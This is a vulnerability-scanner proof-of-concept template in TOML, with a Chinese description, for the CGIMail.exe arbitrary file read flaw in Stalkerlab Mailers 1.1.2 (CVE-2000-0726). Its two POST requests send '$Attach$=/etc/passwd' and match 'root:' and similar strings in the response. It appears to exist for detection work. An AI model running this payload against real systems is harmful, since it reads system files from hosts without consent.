[info]
author = "ave"
description = "验证 Stalkerlab Mailers 1.1.2 中 CGIMail.exe 是否存在任意文件读取漏洞。通过向 $Attach$ 隐藏表单变量传入 /etc/passwd 等系统文件路径，检测响应中是否包含文件内容。"
id = "POC-AVE-2000-0878"
name = "Stalkerlab Mailers CGIMail 任意文件读取漏洞 PoC"
severity = "low"
tags = ["ave-2000-0878"]
vuln_id = [
    "CVE-2000-0726",
    "AVE-2000-0878",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/CGIMail.exe"
protocol = "http"

[poc.requests.body]
content = "$Attach$=/etc/passwd"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "root:",
    "nobody:",
    "daemon:",
]

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/CGIMail.exe"
protocol = "http"

[poc.requests.body]
content = "$Attach$=/etc/passwd"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "root:",
    "nobody:",
    "daemon:",
]
